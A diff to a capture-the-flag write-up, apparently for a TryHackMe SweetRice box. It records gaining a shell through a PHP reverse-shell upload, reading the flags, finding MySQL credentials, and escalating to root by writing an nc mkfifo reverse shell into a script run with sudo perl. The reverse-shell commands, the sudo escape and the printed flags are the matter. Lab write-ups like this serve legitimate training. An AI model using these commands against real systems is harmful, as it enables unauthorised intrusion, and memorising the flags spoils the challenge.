@@ -219,27 +219,110 @@ http://10.10.109.113 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[
 - gain shell via exploit
 - Quick search for exploits lead me to a #FileUpload attack that gives #RCE 
 	- [exploit](https://www.exploit-db.com/exploits/40698) for 1.5.1 SweetRice
+- "Ads" tab can add php code/scripts
+	- Wen to the Theme option here and uploaded a remote file. `revsh.php` using the shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
+- Remembering the file manager, there was an `ads` folder. Navigating to `http://10.10.80.46/content/inc/ads/` we see the `revsh.php`
+	- with `nc` listening on port 443, we click on the `revsh.php` in the browser and catch a shell on LHOST
+```
+┌──(root㉿kali)-[~/Transfer]
+└─# nc -lnvp 443
+listening on [any] 443 ...
+connect to [10.2.1.119] from (UNKNOWN) [10.10.80.46] 56852
+Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
+ 06:13:28 up 45 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
 
-==resume here==
+- User flag - itguy
+```
+www-data@THM-Chal:/home/itguy$ cat user.txt
+cat user.txt
+THM{63e5bce9271952aad1113b6f1ac28a07}
+```
 
-- `Search-That-Hash`
-- Stablize shell
-	- Step 1: `python3 -c 'import pty;pty.spawn("/bin/bash")'`  
-	- Step 2: `CTRL + Z`  
-	- Step 3: `stty raw -echo; fg` 
-	- Step 4: `export TERM=xterm`
+## Pivot to a user
 
-## Pivot to user
-- enumerate!
-- 
+- We find mysql login creds
+```
+www-data@THM-Chal:/home/itguy$ cat mysql_login.txt
+cat mysql_login.txt
+rice:randompass
+```
+- `netstat -ano` shows a #MySQL server running on the localhost
+```
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
+```
+- We log into the server
+```
+www-data@THM-Chal:/home$ mysql -u rice -prandompass -h 127.0.0.1
+mysql -u rice -prandompass -h 127.0.0.1
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 91
+Server version: 5.7.28-0ubuntu0.16.04.2 (Ubuntu)
 
+Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> 
+```
+- This was a rabbit hole but at least I got experience with SQL
 
 ---
 # PrivEsc
 
 - escalate to root
-- PrivEsc_Linux
-- PrivEsc_Windows
-- HackTricks
-- GTFOBins
-- PayloadAllThings
+- checking our `sudo` privileges, we can run `perl` as sudo...
+```
+sudo /usr/bin/perl -e 'exec "/bin/sh";'
+```
+- we also find a perl script in `/home/itguy/backup.pl`
+```
+www-data@THM-Chal:/home/itguy$ cat backup.pl
+cat backup.pl
+#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+```
+- Knowing we can run perl as root, lets edit this `copy.sh` script that it calls,
+```
+www-data@THM-Chal:/etc$ echo "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.1.119 1337 >/tmp/f" > copy.sh
+<p/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.1.119 1337 >/tmp/f" > copy.sh       
+
+www-data@THM-Chal:/etc$ cat copy.sh
+cat copy.sh
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.1.119 1337 >/tmp/f
+
+```
+
+- Execute perl script with sudo
+	- Be sure to use full file paths found in `sudo -l`
+```
+www-data@THM-Chal:/etc$ sudo /usr/bin/perl /home/itguy/backup.pl
+sudo /usr/bin/perl /home/itguy/backup.pl
+```
+
+- Catch reverse shell as root by running #perl script as #sudo 
+```
+┌──(root㉿kali)-[~/Transfer]
+└─# nc -lnvp 1337
+listening on [any] 1337 ...
+connect to [10.2.1.119] from (UNKNOWN) [10.10.80.46] 46854
+# whoami
+root
+```
+
+- Root flag
+```
+# cat root.txt
+THM{6637f41d0177b6f37cb20d775124699f}
+```
